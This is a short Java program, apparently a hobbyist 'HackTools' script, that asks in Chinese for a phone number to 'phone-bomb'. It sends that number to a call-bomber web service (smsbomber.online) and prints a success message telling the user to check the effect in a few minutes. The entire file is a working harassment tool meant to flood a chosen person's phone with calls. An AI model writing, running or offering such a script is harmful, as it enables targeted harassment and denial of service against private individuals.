
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;
import java.io.InputStreamReader;

 class t2 {
    public static void main(String[] args) throws IOException {
		System.out.println("===请输入要电话轰炸的手机号===");
		Scanner tel= new Scanner(System.in);
		System.out.print("Root@HackTools：>");
		String tel1 = tel.next();
		String url5 = "https://smsbomber.online/call-bomber.php?number="+tel1;
		// 打开URL
		URL u5 = new URL(url5);
		// 打开连接
		BufferedReader l = new BufferedReader(new InputStreamReader(u5.openStream()));
		// 读取网页内容
		String line5;
		while ((line5 = l.readLine()) != null){
			System.out.println("┈┈┈┈▕▔╲┈┈┈┈\n┈┈┈┈┈▏▕┈┈┈┈\n┈┈┈┈┈▏▕▂▂▂┈\n▂▂▂▂╱┈▕▂▂▂▏\n▉▉▉┈┈┈▕▂▂▂▏\n▉▉▉┈┈┈▕▂▂▂▏\n▔▔▔▔╲▂▕▂▂▂▏\n");
			System.out.println("轰炸成功，过几分钟查看效果");
		}
		// 关闭连接
		l.close();
	
	
    }
	}
	
